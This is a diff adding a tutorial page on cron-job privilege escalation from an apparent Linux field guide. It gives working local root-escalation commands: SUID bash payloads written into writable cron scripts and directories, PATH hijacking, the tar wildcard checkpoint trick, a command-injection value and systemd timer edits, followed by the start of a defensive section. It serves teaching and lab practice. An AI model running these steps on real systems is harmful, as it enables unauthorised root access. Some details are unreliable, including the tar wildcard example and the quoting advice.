@@ -1,0 +1,497 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="dark">
+  <meta name="theme-color" content="#050505">
+  <meta name="description" content="Privilege Escalation part 4 of 10. Inspect system and user schedules, then test writable jobs and wildcard risks.">
+  <title>Part 04: Cron Jobs | 0XMAP Privilege Escalation</title>
+  <link rel="icon" href="../static/favicon.svg" type="image/svg+xml">
+  <link rel="stylesheet" href="../static/guide.css">
+</head>
+<body data-root="../">
+  <a class="g-skip" href="#main">Skip to content</a>
+  
+<header class="g-top">
+  <div class="g-top-inner">
+    <a class="g-brand" href="../index.html" aria-label="0XMAP Linux field guide home">
+      <span class="g-mark" aria-hidden="true"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M4 7l4 5-4 5"/><path d="M12 17h8"/></svg></span>
+      <span class="g-brand-text">
+        <span class="g-name">0XMAP</span>
+        <span class="g-sub">Linux field guide</span>
+      </span>
+    </a>
+    <div class="g-top-actions">
+      <nav class="g-top-nav" aria-label="Guide">
+        <a href="../index.html#about">Guide</a>
+        <a href="../index.html#foundations">Foundations</a>
+        <a href="../index.html#privesc">Privilege escalation</a>
+        <a href="../index.html#chapters">Chapters</a>
+      </nav>
+      <button type="button" class="g-search-btn" data-search-open aria-label="Search the guide">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="11" cy="11" r="6.5"/><path d="m16 16 4 4"/></svg>
+        <span>Search</span>
+        <kbd>/</kbd>
+      </button>
+      <span class="g-context-pill">Privilege escalation</span>
+      <button type="button" class="g-menu-btn" data-menu-toggle aria-label="Open chapter menu" aria-expanded="false"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M4 7h16M4 12h16M4 17h16"/></svg></button>
+    </div>
+  </div>
+</header>
+  
+<div class="g-doc-layout">
+  
+<aside class="g-sidebar" data-sidebar aria-label="Privilege escalation navigation">
+  <div class="g-sidebar-head">
+    <div>
+      <p class="g-sidebar-kicker">Privilege Escalation</p>
+      <p class="g-sidebar-count">10 parts / practitioner path</p>
+    </div>
+    <button type="button" class="g-side-close" data-menu-close aria-label="Close handbook menu">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M6 6l12 12M18 6 6 18"/></svg>
+    </button>
+  </div>
+  <nav class="g-side-nav">
+    <section class="g-nav-part">
+      <div class="g-nav-part-head"><span class="g-nav-part-num">PE</span><span>Handbook</span></div>
+      <ol><li><a class="g-nav-link g-nav-link-simple" href="../privesc/01-sudo-misconfigurations.html"><span class="g-nav-num">01</span><span class="g-nav-title">Sudo</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/02-suid-sgid-binaries.html"><span class="g-nav-num">02</span><span class="g-nav-title">SUID and SGID</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/03-linux-capabilities.html"><span class="g-nav-num">03</span><span class="g-nav-title">Capabilities</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/04-cron-jobs.html" aria-current="page"><span class="g-nav-num">04</span><span class="g-nav-title">Cron jobs</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/05-writable-system-files.html"><span class="g-nav-num">05</span><span class="g-nav-title">Writable files</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/06-path-hijacking.html"><span class="g-nav-num">06</span><span class="g-nav-title">PATH hijacking</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/07-environment-variable-abuse.html"><span class="g-nav-num">07</span><span class="g-nav-title">Environment</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/08-kernel-exploits.html"><span class="g-nav-num">08</span><span class="g-nav-title">Kernel</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/09-service-misconfigurations.html"><span class="g-nav-num">09</span><span class="g-nav-title">Services</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/10-nfs-misconfigurations.html"><span class="g-nav-num">10</span><span class="g-nav-title">NFS</span></a></li></ol>
+    </section>
+  </nav>
+  <a class="g-side-guide" href="../chapters/26-automating-linux-privilege-escalation-checks.html">
+    <span class="g-side-guide-kicker">Apply it</span>
+    <strong>Chapter 26 / automation</strong>
+    <span>Turn the checks into a repeatable enumeration pass</span>
+  </a>
+  <a class="g-side-guide" href="../index.html#foundations">
+    <span class="g-side-guide-kicker">Companion handbook</span>
+    <strong>Linux Foundations</strong>
+    <span>10 parts from first command to secure baseline</span>
+  </a>
+  <p class="g-sidebar-note">Use these techniques only in labs, CTFs or systems you own and have written permission to test.</p>
+</aside>
+<div class="g-scrim" data-menu-close hidden></div>
+  <main class="g-content" id="main">
+    <article class="g-article">
+      <header class="g-chapter-head">
+        <nav class="g-chapter-crumb" aria-label="Breadcrumb">
+          <a href="../index.html">Field guide</a><span>/</span>
+          <a href="../index.html#privesc">Privilege Escalation</a><span>/</span>
+          <span>Part 04</span>
+        </nav>
+        <p class="g-kicker">Privilege Escalation / Part 04</p>
+        <h1>Cron Jobs</h1>
+        <p class="g-deck">Inspect system and user schedules, then test writable jobs and wildcard risks.</p>
+        <div class="g-chapter-meta">
+          <span>12 min read</span>
+          <span>7 sections</span>
+          <span>26 code blocks</span>
+          <span>Part 04 / 10</span>
+        </div>
+      </header>
+      
+<details class="g-toc-mobile">
+  <summary>On this page <span>7 sections</span></summary>
+  <nav aria-label="On this page"><a class="g-toc-link depth-2" href="#cron-jobs-for-privilege-escalation" data-toc-link>Cron Jobs for Privilege Escalation</a><a class="g-toc-link depth-3" href="#1-understanding-cron" data-toc-link>1. Understanding Cron</a><a class="g-toc-link depth-3" href="#2-enumeration-finding-cron-jobs" data-toc-link>2. Enumeration: Finding Cron Jobs</a><a class="g-toc-link depth-3" href="#3-exploitation-vectors" data-toc-link>3. Exploitation Vectors</a><a class="g-toc-link depth-3" href="#4-automated-exploitation" data-toc-link>4. Automated Exploitation</a><a class="g-toc-link depth-3" href="#5-advanced-techniques" data-toc-link>5. Advanced Techniques</a><a class="g-toc-link depth-3" href="#6-defensive-measures" data-toc-link>6. Defensive Measures</a></nav>
+</details>
+      <div class="g-prose"><h2 id="cron-jobs-for-privilege-escalation">Cron Jobs for Privilege Escalation<a aria-label="Link to this section" class="g-anchor" href="#cron-jobs-for-privilege-escalation">#</a></h2>
+<p>Cron is the Linux task scheduler that runs commands and scripts at specified times. <strong>Cron jobs running as root</strong> are a prime privilege escalation vector when misconfigured, especially if the scripts or their parent directories are writable by lower-privileged users.</p>
+<hr/>
+<h3 id="1-understanding-cron">1. Understanding Cron<a aria-label="Link to this section" class="g-anchor" href="#1-understanding-cron">#</a></h3>
+<p><strong>What is Cron?</strong></p>
+<ul>
+<li>System daemon that executes scheduled tasks</li>
+<li>Runs with the privileges of the user who owns the crontab</li>
+<li>Root-owned cron jobs run with <strong>full root privileges</strong></li>
+<li>Typically runs scripts for backups, log rotation, system maintenance, etc.</li>
+</ul>
+<p><strong>Cron File Locations</strong>:</p>
+<div class="g-table-wrap"><table class="g-table">
+<thead>
+<tr>
+<th>Location</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>/etc/crontab</code></td>
+<td>System-wide crontab (specifies user to run as)</td>
+</tr>
+<tr>
+<td><code>/etc/cron.d/</code></td>
+<td>System-wide cron files</td>
+</tr>
+<tr>
+<td><code>/etc/cron.hourly/</code></td>
+<td>Scripts run every hour</td>
+</tr>
+<tr>
+<td><code>/etc/cron.daily/</code></td>
+<td>Scripts run daily</td>
+</tr>
+<tr>
+<td><code>/etc/cron.weekly/</code></td>
+<td>Scripts run weekly</td>
+</tr>
+<tr>
+<td><code>/etc/cron.monthly/</code></td>
+<td>Scripts run monthly</td>
+</tr>
+<tr>
+<td><code>/var/spool/cron/crontabs/</code></td>
+<td>User-specific crontabs (Debian/Ubuntu)</td>
+</tr>
+<tr>
+<td><code>/var/spool/cron/</code></td>
+<td>User-specific crontabs (RHEL/CentOS)</td>
+</tr>
+<tr>
+<td><code>/etc/cron.allow</code></td>
+<td>Users allowed to use cron (if exists)</td>
+</tr>
+<tr>
+<td><code>/etc/cron.deny</code></td>
+<td>Users denied from using cron</td>
+</tr>
+</tbody>
+</table></div>
+<hr/>
+<h3 id="2-enumeration-finding-cron-jobs">2. Enumeration: Finding Cron Jobs<a aria-label="Link to this section" class="g-anchor" href="#2-enumeration-finding-cron-jobs">#</a></h3>
+<p><strong>List all cron jobs for current user</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash">crontab<span class="w"> </span>-l
+</code></pre></div>
+<p><strong>List root's cron jobs</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash">sudo<span class="w"> </span>crontab<span class="w"> </span>-l
+</code></pre></div>
+<p><strong>Find all cron files</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash">ls<span class="w"> </span>-la<span class="w"> </span>/etc/cron*
+cat<span class="w"> </span>/etc/crontab
+cat<span class="w"> </span>/etc/cron.d/*<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+
+<span class="c1"># User crontabs</span>
+ls<span class="w"> </span>-la<span class="w"> </span>/var/spool/cron/crontabs/<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+ls<span class="w"> </span>-la<span class="w"> </span>/var/spool/cron/<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+
+<span class="c1"># Directory scripts</span>
+ls<span class="w"> </span>-la<span class="w"> </span>/etc/cron.hourly/<span class="w"> </span>/etc/cron.daily/<span class="w"> </span>/etc/cron.weekly/<span class="w"> </span>/etc/cron.monthly/
+</code></pre></div>
+<p><strong>Check for cron scripts in other locations</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Look for scripts that might be called by cron</span>
+find<span class="w"> </span>/<span class="w"> </span>-name<span class="w"> </span><span class="s2">"*.sh"</span><span class="w"> </span>-exec<span class="w"> </span>grep<span class="w"> </span>-l<span class="w"> </span><span class="s2">"cron\|daily\|weekly\|hourly"</span><span class="w"> </span><span class="o">{}</span><span class="w"> </span><span class="se">\;</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null
+
+<span class="c1"># Check for custom cron directories</span>
+find<span class="w"> </span>/etc<span class="w"> </span>-name<span class="w"> </span><span class="s2">"*cron*"</span><span class="w"> </span>-type<span class="w"> </span>d<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+</code></pre></div>
+<p><strong>Monitor running cron jobs</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># View cron logs</span>
+tail<span class="w"> </span>-f<span class="w"> </span>/var/log/syslog<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>CRON
+tail<span class="w"> </span>-f<span class="w"> </span>/var/log/cron
+journalctl<span class="w"> </span>-u<span class="w"> </span>cron<span class="w"> </span>-f
+
+<span class="c1"># See what's currently running</span>
+ps<span class="w"> </span>aux<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>cron
+</code></pre></div>
+<hr/>
+<h3 id="3-exploitation-vectors">3. Exploitation Vectors<a aria-label="Link to this section" class="g-anchor" href="#3-exploitation-vectors">#</a></h3>
+<h4 id="a-writable-cron-scripts-most-common">A. Writable Cron Scripts (Most Common)<a aria-label="Link to this section" class="g-anchor" href="#a-writable-cron-scripts-most-common">#</a></h4>
+<p>If a cron job executes a script that is <strong>writable</strong> by a lower-privileged user, that user can modify the script to execute arbitrary commands as root.</p>
+<p><strong>Example Scenario</strong>:</p>
+<ul>
+<li>Root cron runs: <code>/usr/local/bin/backup.sh</code> every hour</li>
+<li>Script is world-writable: <code>-rwxrwxrwx 1 root root</code></li>
+<li>Attacker modifies the script:<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="nb">echo</span><span class="w"> </span><span class="s1">'#!/bin/bash</span>
+<span class="s1">chmod +s /bin/bash</span>
+<span class="s1">echo "hacked" &gt; /tmp/flag'</span><span class="w"> </span>&gt;<span class="w"> </span>/usr/local/bin/backup.sh
+</code></pre></div>
+</li>
+<li>When cron runs, <code>/bin/bash</code> becomes SUID root</li>
+</ul>
+<p><strong>Complete Exploit Workflow</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># 1. Find writable cron scripts</span>
+find<span class="w"> </span>/etc/cron*<span class="w"> </span>/var/spool/cron<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-writable<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+find<span class="w"> </span>/<span class="w"> </span>-path<span class="w"> </span>/proc<span class="w"> </span>-prune<span class="w"> </span>-o<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-name<span class="w"> </span><span class="s2">"*.sh"</span><span class="w"> </span>-writable<span class="w"> </span>-exec<span class="w"> </span>ls<span class="w"> </span>-la<span class="w"> </span><span class="o">{}</span><span class="w"> </span><span class="se">\;</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null
+
+<span class="c1"># 2. Identify if it's executed by root</span>
+cat<span class="w"> </span>/etc/crontab<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>writable_script
+
+<span class="c1"># 3. Inject payload</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s1">'#!/bin/bash</span>
+<span class="s1">cp /bin/bash /tmp/rootbash</span>
+<span class="s1">chmod +s /tmp/rootbash'</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/path/to/writable/script.sh
+
+<span class="c1"># 4. Wait for cron to execute (or trigger manually if possible)</span>
+/tmp/rootbash<span class="w"> </span>-p<span class="w">  </span><span class="c1"># Get root shell</span>
+</code></pre></div>
+<hr/>
+<h4 id="b-writable-cron-directories">B. Writable Cron Directories<a aria-label="Link to this section" class="g-anchor" href="#b-writable-cron-directories">#</a></h4>
+<p>If a cron directory (like <code>/etc/cron.daily/</code>) is writable, an attacker can add a new script.</p>
+<p><strong>Exploitation</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Check directory permissions</span>
+ls<span class="w"> </span>-ld<span class="w"> </span>/etc/cron.daily/
+<span class="c1"># Output: drwxrwxrwx 2 root root</span>
+
+<span class="c1"># Create malicious script</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s1">'#!/bin/bash</span>
+<span class="s1">chmod +s /bin/bash'</span><span class="w"> </span>&gt;<span class="w"> </span>/etc/cron.daily/exploit.sh
+chmod<span class="w"> </span>+x<span class="w"> </span>/etc/cron.daily/exploit.sh
+
+<span class="c1"># Wait for execution</span>
+</code></pre></div>
+<p><strong>Note</strong>: The script must be executable (<code>chmod +x</code>) and typically needs to have no extension restrictions (depends on system configuration).</p>
+<hr/>
+<h4 id="c-path-hijacking-in-cron">C. PATH Hijacking in Cron<a aria-label="Link to this section" class="g-anchor" href="#c-path-hijacking-in-cron">#</a></h4>
+<p>If a cron script uses a command <strong>without an absolute path</strong> (e.g., <code>backup</code> instead of <code>/usr/local/bin/backup</code>), cron's PATH can be exploited.</p>
+<p><strong>Exploitation</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># 1. Check cron's PATH (in /etc/crontab)</span>
+cat<span class="w"> </span>/etc/crontab
+<span class="c1"># Output: PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span>
+
+<span class="c1"># 2. Find a cron script that calls commands without full path</span>
+cat<span class="w"> </span>/etc/cron.daily/logrotate
+<span class="c1"># Output: compress_logs  # No absolute path</span>
+
+<span class="c1"># 3. Create a malicious binary in a PATH directory that's writable</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s1">'#!/bin/bash</span>
+<span class="s1">cp /bin/bash /tmp/rootbash</span>
+<span class="s1">chmod +s /tmp/rootbash'</span><span class="w"> </span>&gt;<span class="w"> </span>/usr/local/bin/compress_logs
+chmod<span class="w"> </span>+x<span class="w"> </span>/usr/local/bin/compress_logs
+
+<span class="c1"># 4. Wait for cron to run</span>
+</code></pre></div>
+<p><strong>Alternative</strong>: If a writable directory is <strong>earlier</strong> in PATH than the legitimate binary location, hijacking is possible:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Add /tmp to front of PATH for cron (if cron uses system PATH)</span>
+<span class="nb">export</span><span class="w"> </span><span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span><span class="w">  </span><span class="c1"># Doesn't work for cron normally</span>
+</code></pre></div>
+<p><strong>Cron-specific PATH</strong>: If using <code>/etc/crontab</code>, PATH is defined there. If using user crontabs, PATH is defined in the user's environment.</p>
+<hr/>
+<h4 id="d-wildcard-injection-in-cron-scripts">D. Wildcard Injection in Cron Scripts<a aria-label="Link to this section" class="g-anchor" href="#d-wildcard-injection-in-cron-scripts">#</a></h4>
+<p>When a cron script uses wildcards (<code>*</code>) in commands like <code>tar</code>, <code>chown</code>, or <code>rm</code>, an attacker can create files with special filenames that execute arbitrary commands.</p>
+<p><strong>Classic Example - Tar Wildcard Exploit</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Cron job doing: tar -czf /backup/backup.tgz /var/www/*</span>
+<span class="c1"># Attacker in /var/www/:</span>
+touch<span class="w"> </span>--<span class="w"> </span><span class="s1">'--checkpoint=1'</span>
+touch<span class="w"> </span>--<span class="w"> </span><span class="s1">'--checkpoint-action=exec=sh exploit.sh'</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s1">'#!/bin/bash</span>
+<span class="s1">chmod +s /bin/bash'</span><span class="w"> </span>&gt;<span class="w"> </span>exploit.sh
+chmod<span class="w"> </span>+x<span class="w"> </span>exploit.sh
+
+<span class="c1"># When cron runs tar, the wildcard expands to:</span>
+tar<span class="w"> </span>-czf<span class="w"> </span>/backup/backup.tgz<span class="w"> </span>/var/www/--checkpoint<span class="o">=</span><span class="m">1</span><span class="w"> </span>--checkpoint-action<span class="o">=</span><span class="nv">exec</span><span class="o">=</span>sh<span class="se">\ </span>exploit.sh
+<span class="c1"># Tar executes exploit.sh as root</span>
+</code></pre></div>
+<p><strong>Other Dangerous Commands with Wildcards</strong>:</p>
+<ul>
+<li><code>rm -rf /path/*</code> → Create <code>--no-preserve-root</code> to delete everything</li>
+<li><code>chown -R user:group /path/*</code> → Create <code>--reference=somefile</code> to change ownership</li>
+<li><code>cp -r /path/* /dest/</code> → Create <code>--preserve=all</code> options</li>
+</ul>
+<p><strong>Mitigation</strong>: Always quote wildcards: <code>"$@"</code> instead of <code>$@</code>, or use <code>--</code> to end options: <code>tar -czf /backup/backup.tgz -- /var/www/*</code></p>
+<hr/>
+<h4 id="e-symbolic-link-attacks-toctou">E. Symbolic Link Attacks (TOCTOU)<a aria-label="Link to this section" class="g-anchor" href="#e-symbolic-link-attacks-toctou">#</a></h4>
+<p>Time of Check to Time of Use (TOCTOU) vulnerability where a cron script checks a file's permissions, then uses it, but the file is swapped in between.</p>
+<p><strong>Example</strong>: If a cron script does:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span>-w<span class="w"> </span>/tmp/data<span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
+<span class="w">    </span>cat<span class="w"> </span>/tmp/data<span class="w"> </span>&gt;&gt;<span class="w"> </span>/var/log/secure.log
+<span class="k">fi</span>
+</code></pre></div>
+<p><strong>Exploitation</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Create a symlink to /etc/shadow</span>
+ln<span class="w"> </span>-s<span class="w"> </span>/etc/shadow<span class="w"> </span>/tmp/data
+
+<span class="c1"># Wait for cron to check (will pass if data is writable? No, check fails)</span>
+<span class="c1"># Better: Create a file /tmp/data, then in the race window, replace with symlink</span>
+</code></pre></div>
+<p><strong>More dangerous</strong>: If cron uses <code>chown</code> or <code>chmod</code> recursively:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Cron does: chown -R root:root /tmp/process_data/</span>
+<span class="c1"># Attacker creates symlink in /tmp/process_data/ pointing to /etc/passwd</span>
+<span class="c1"># When cron runs, it changes ownership of /etc/passwd to root:root (already root, but could be other targets)</span>
+</code></pre></div>
+<hr/>
+<h4 id="f-anacron-jobs">F. Anacron Jobs<a aria-label="Link to this section" class="g-anchor" href="#f-anacron-jobs">#</a></h4>
+<p>Anacron runs jobs that might be missed if system is off. Similar vulnerabilities apply.</p>
+<p><strong>Locations</strong>:</p>
+<ul>
+<li><code>/etc/anacrontab</code></li>
+<li><code>/var/spool/anacron/</code></li>
+</ul>
+<hr/>
+<h4 id="g-systemd-timers-modern-cron">G. Systemd Timers (Modern Cron)<a aria-label="Link to this section" class="g-anchor" href="#g-systemd-timers-modern-cron">#</a></h4>
+<p>Modern systems often use systemd timers instead of cron. These can also be exploited.</p>
+<p><strong>Enumerate</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># List all timers</span>
+systemctl<span class="w"> </span>list-timers<span class="w"> </span>--all
+
+<span class="c1"># Check timer details</span>
+systemctl<span class="w"> </span>status<span class="w"> </span>&lt;timer&gt;.timer
+
+<span class="c1"># Find writable service files</span>
+find<span class="w"> </span>/etc/systemd/system/<span class="w"> </span>-name<span class="w"> </span><span class="s2">"*.service"</span><span class="w"> </span>-writable<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+</code></pre></div>
+<p><strong>Exploitation</strong>: If a timer's service file is writable, modify it to execute commands:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Edit service file</span>
+vim<span class="w"> </span>/etc/systemd/system/backup.service
+<span class="c1"># Add: ExecStart=/bin/bash -c 'chmod +s /bin/bash'</span>
+
+<span class="c1"># Reload and restart</span>
+systemctl<span class="w"> </span>daemon-reload
+systemctl<span class="w"> </span>restart<span class="w"> </span>backup.service
+</code></pre></div>
+<hr/>
+<h3 id="4-automated-exploitation">4. Automated Exploitation<a aria-label="Link to this section" class="g-anchor" href="#4-automated-exploitation">#</a></h3>
+<p><strong>Tools to identify cron misconfigurations</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># LinPEAS cron checks</span>
+./linpeas.sh<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-A<span class="w"> </span><span class="m">10</span><span class="w"> </span><span class="s2">"Cron Jobs"</span>
+
+<span class="c1"># LinEnum</span>
+./linenum.sh<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span>cron
+
+<span class="c1"># Custom quick check</span>
+<span class="k">for</span><span class="w"> </span>cron_file<span class="w"> </span><span class="k">in</span><span class="w"> </span>/etc/crontab<span class="w"> </span>/etc/cron.d/*<span class="w"> </span>/var/spool/cron/*<span class="w"> </span>/var/spool/cron/crontabs/*<span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<span class="w">    </span><span class="o">[</span><span class="w"> </span>-f<span class="w"> </span><span class="s2">"</span><span class="nv">$cron_file</span><span class="s2">"</span><span class="w"> </span><span class="o">]</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s2">"=== </span><span class="nv">$cron_file</span><span class="s2"> ==="</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>cat<span class="w"> </span><span class="s2">"</span><span class="nv">$cron_file</span><span class="s2">"</span>
+<span class="k">done</span>
+</code></pre></div>
+<hr/>
+<h3 id="5-advanced-techniques">5. Advanced Techniques<a aria-label="Link to this section" class="g-anchor" href="#5-advanced-techniques">#</a></h3>
+<h4 id="a-script-dependencies">A. Script Dependencies<a aria-label="Link to this section" class="g-anchor" href="#a-script-dependencies">#</a></h4>
+<p>If a cron script includes or sources other files:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Cron script does: source /etc/config/backup.conf</span>
+<span class="c1"># Attacker writes to /etc/config/backup.conf (if writable)</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s1">'chmod +s /bin/bash'</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/etc/config/backup.conf
+</code></pre></div>
+<h4 id="b-command-injection-in-variables">B. Command Injection in Variables<a aria-label="Link to this section" class="g-anchor" href="#b-command-injection-in-variables">#</a></h4>
+<p>If cron script uses user-controlled input:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Cron script: zip -r backup.zip $(cat /tmp/filelist.txt)</span>
+<span class="c1"># Attacker writes to /tmp/filelist.txt:</span>
+<span class="p">;</span><span class="w"> </span>chmod<span class="w"> </span>+s<span class="w"> </span>/bin/bash<span class="p">;</span>
+</code></pre></div>
+<hr/>
+<h3 id="6-defensive-measures">6. Defensive Measures<a aria-label="Link to this section" class="g-anchor" href="#6-defensive-measures">#</a></h3>
+<p><strong>For System Administrators</strong>:</p>
+<ol>
+<li>
+<p><strong>Proper Permissions</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Restrict cron directories</span>
+chmod<span class="w"> </span><span class="m">755</span><span class="w"> </span>/etc/cron.daily/
+chmod<span class="w"> </span><span class="m">644</span><span class="w"> </span>/etc/crontab
+chown<span class="w"> </span>root:root<span class="w"> </span>/etc/crontab
+
+<span class="c1"># Make cron scripts non-writable</span>
+chmod<span class="w"> </span><span class="m">755</span><span class="w"> </span>/usr/local/bin/backup.sh
+chown<span class="w"> </span>root:root<span class="w"> </span>/usr/local/bin/backup.sh
+</code></pre></div>
+</li>
+<li>
+<p><strong>Use Absolute Paths</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Bad</span>
+*<span class="w"> </span>*<span class="w"> </span>*<span class="w"> </span>*<span class="w"> </span>*<span class="w"> </span>root<span class="w"> </span>backup_script
+
+<span class="c1"># Good</span>
+*<span class="w"> </span>*<span class="w"> </span>*<span class="w"> </span>*<span class="w"> </span>*<span class="w"> </span>root<span class="w"> </span>/usr/local/bin/backup_script
+</code></pre></div>
+</li>
+<li>
+<p><strong>Avoid Wildcards in Destructive Commands</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Bad</span>
